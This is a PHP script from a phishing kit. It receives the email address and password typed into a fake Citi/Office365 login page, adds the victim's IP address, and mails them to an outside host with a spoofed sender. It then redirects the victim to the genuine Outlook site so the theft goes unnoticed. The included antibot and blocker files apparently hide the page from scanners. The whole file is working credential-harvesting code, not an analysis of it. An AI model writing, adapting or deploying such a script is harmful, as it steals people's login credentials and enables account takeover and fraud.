<?php
/*   
Mou-Ad                    
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include "antibots.php";
include './bt.php';
include "./blocker.php";
?>

<?

$ip = getenv
("REMOTE_ADDR");
$message .= "-----------  ! +Citi LOGIN ! xDD+ !  -----------\n";
$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "Email Address        : ".$_POST['username']."\n";
$message .= "Password               : ".$_POST['passwd']."\n";
$message .= "IP Address             : ".$ip."\n";
$message .= "-----------  ! +nJoY+ !  -----------\n";
$send = "rebeccahandley.com";

$subject = "Office365 logs xD $ip";
$headers = "From:  El Patron<xConsoLe@alboraaq.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);


header("Location: https://outlook.office.com");